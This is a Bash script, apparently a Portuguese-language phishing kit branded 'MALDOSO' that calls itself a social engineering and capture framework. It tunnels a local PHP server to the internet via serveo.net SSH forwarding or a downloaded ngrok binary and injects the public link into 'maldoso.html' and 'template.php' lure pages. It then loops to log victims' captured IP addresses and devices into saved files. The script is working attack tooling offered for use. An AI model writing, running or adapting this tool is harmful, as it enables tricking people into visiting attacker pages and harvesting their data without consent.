#!/bin/bash

# ================== TEMA HACKER ==================
BLACK="\e[0;30m"
RED="\e[1;91m"
GREEN="\e[1;92m"
YELLOW="\e[1;93m"
BLUE="\e[1;94m"
PURPLE="\e[1;95m"
CYAN="\e[1;96m"
WHITE="\e[1;97m"
GRAY="\e[1;90m"
RESET="\e[0m"

BOLD="\e[1m"
DIM="\e[2m"

OK="${GREEN}✔${RESET}"
INFO="${CYAN}ℹ${RESET}"
WARN="${YELLOW}⚠${RESET}"
ERR="${RED}✖${RESET}"
WAIT="${PURPLE}…${RESET}"

clear
trap 'printf "\n";stop' 2

# ================== FUNÇÕES VISUAIS ==================
separator() {
  printf "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"
}

typewriter() {
  text="$1"
  delay=0.015
  for (( i=0; i<${#text}; i++ )); do
    printf "%s" "${text:$i:1}"
    sleep $delay
  done
  printf "\n"
}

log() {
  printf "${GRAY}[%s]${RESET} %b\n" "$(date '+%H:%M:%S')" "$1"
}

loading() {
  printf "${GRAY}[${GREEN}*${GRAY}] Inicializando"
  for i in {1..4}; do
    printf "${GREEN}.${RESET}"
    sleep 0.4
  done
  printf "\n"
}

# ================== BANNER ==================
banner() {
clear
separator
printf "${GREEN}${BOLD}"
cat << "EOF"
███╗   ███╗ █████╗ ██╗     ██████╗  ██████╗ ███████╗ ██████╗ 
████╗ ████║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔════╝██╔═══██╗
██╔████╔██║███████║██║     ██║  ██║██║   ██║███████╗██║   ██║
██║╚██╔╝██║██╔══██║██║     ██║  ██║██║   ██║╚════██║██║   ██║
██║ ╚═╝ ██║██║  ██║███████╗██████╔╝╚██████╔╝███████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝ 
EOF
printf "${RESET}"
separator
typewriter "${GREEN}>> Framework de Engenharia Social & Captura <<${RESET}"
printf "${GRAY}:: Autor  : Duzinn${RESET}\n"
printf "${GRAY}:: Versão : 1.0${RESET}\n"
printf "${GRAY}:: Status : ${GREEN}ONLINE${RESET}\n"
separator
loading
}

# ================== CONTROLE ==================
stop() {
pkill -f ngrok > /dev/null 2>&1
pkill -f php > /dev/null 2>&1
pkill -f ssh > /dev/null 2>&1
exit 1
}

dependencies() {
command -v php > /dev/null 2>&1 || {
log "${ERR} PHP não está instalado. Abortando."
exit 1
}
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
log "${OK} IP capturado: ${GREEN}$ip${RESET}"
cat ip.txt >> saved.ip.txt
}

checkfound() {
log "${WAIT} Aguardando alvos... Ctrl + C para sair"
while true; do
  if [[ -e "ip.txt" ]]; then
    log "${OK} IP resgatado"
    catch_ip
    rm -rf ip.txt
  fi
  sleep 0.5
  if [[ -e "Log.log" ]]; then
    log "${OK} Dispositivo capturado com sucesso"
    rm -rf Log.log
  fi
  sleep 0.5
done
}

server() {
command -v ssh > /dev/null 2>&1 || {
log "${ERR} SSH não está instalado. Abortando."
exit 1
}

log "${INFO} Iniciando Serveo..."
pkill -f php > /dev/null 2>&1

if [[ $subdomain_resp == true ]]; then
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
-R $subdomain:80:localhost:3333 serveo.net \
2> /dev/null > sendlink &
else
ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 \
-R 80:localhost:3333 serveo.net \
2> /dev/null > sendlink &
fi

sleep 8
log "${INFO} Iniciando servidor PHP (localhost:3333)..."
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &

sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
log "${OK} Link direto: ${GREEN}$send_link${RESET}"
}

payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed "s+forwarding_link+$send_link+g" maldoso.html > index2.html
sed "s+forwarding_link+$send_link+g" template.php > index.php
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed "s+forwarding_link+$link+g" maldoso.html > index2.html
sed "s+forwarding_link+$link+g" template.php > index.php
}

ngrok_server() {
command -v unzip > /dev/null 2>&1 || exit 1
command -v wget > /dev/null 2>&1 || exit 1

if [[ ! -e ngrok ]]; then
log "${INFO} Baixando ngrok..."
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
fi

log "${INFO} Iniciando servidor PHP..."
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2

log "${INFO} Iniciando ngrok..."
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
log "${OK} Link direto: ${GREEN}$link${RESET}"

payload_ngrok
checkfound
}

start1() {
rm -f sendlink
separator
printf "${GREEN}[01]${RESET} ${GRAY}Servidor Local${RESET}\n"
printf "${GREEN}[02]${RESET} ${GRAY}Servidor Online (Ngrok)${RESET}\n"
separator
read -p "$(echo -e ${PURPLE}'➜ Escolha uma opção: '${RESET})" option_server
option_server="${option_server:-1}"

if [[ $option_server -eq 1 ]]; then
start
elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
log "${ERR} Opção inválida"
sleep 1
clear
start1
fi
}

start() {
default_subdomain="maldoso$RANDOM"
read -p "$(echo -e ${GRAY}'[+] Escolher subdomínio? [Y/n]: '${RESET})" choose_sub
choose_sub="${choose_sub:-Y}"

if [[ $choose_sub =~ ^[Yy]$ ]]; then
subdomain_resp=true
read -p "$(echo -e ${GRAY}'[+] Subdomínio (default: '${default_subdomain}'):'${RESET})" subdomain
subdomain="${subdomain:-$default_subdomain}"
fi

server
payload
checkfound
}

# ================== EXECUÇÃO ==================
banner
dependencies
start1
